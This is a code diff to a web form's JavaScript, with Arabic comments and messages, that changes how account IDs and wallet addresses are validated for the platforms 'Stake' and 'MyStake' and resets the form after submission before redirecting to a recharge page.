@@ -84,23 +84,31 @@ let platform = null;
 const repReg = /^(\d)\1{6,}$/;
 
 function validate() {
-  const val = uid.value.trim();
-  uid.value = val;
+  let val = uid.value.trim();
+
+  // منع الأحرف العربية في Wallet Address
+  if(platform === "Stake" || platform === "MyStake"){
+    val = val.replace(/[\u0600-\u06FF\s]+/g, '');
+    uid.value = val;
+  }
+
   errMsg.textContent = '';
   go.disabled = true;
 
-  if(val.length < 7) return;
-
-  if(repReg.test(val)){
-    errMsg.textContent = 'المعرّف غير صالح';
-    return;
-  }
-  if(!platform){
+  if(!platform) {
     errMsg.textContent = 'يرجى اختيار المنصة.';
     return;
   }
 
-  go.disabled = false;
+  if(platform !== "Stake" && platform !== "MyStake"){
+    if(val.length < 7) return;
+    if(repReg.test(val)){
+      errMsg.textContent = 'المعرّف غير صالح';
+      return;
+    }
+  }
+
+  if(val.length > 0) go.disabled = false;
 }
 
 platformSelect.addEventListener('change', () => {
@@ -132,6 +140,18 @@ go.addEventListener('click', async () => {
   try{
     await fetch(SCRIPT_URL, { method:'POST', body: formData });
     localStorage.setItem('walletAddress', uid.value.trim());
+
+    // إعادة ضبط النموذج
+    uid.value = '';
+    platformSelect.value = '';
+    platform = null;
+    document.getElementById('id-label').textContent = "Account ID";
+    uid.placeholder = "مثال: 87654321";
+    uid.setAttribute("inputmode","numeric");
+    uid.setAttribute("maxlength","15");
+    go.disabled = true;
+    go.innerText = 'تأكيد';
+
     window.location.href = 'fr/office/recharge.html';
   } catch(err){
     errMsg.textContent = 'حدث خطأ أثناء الإرسال، حاول مجددًا.';
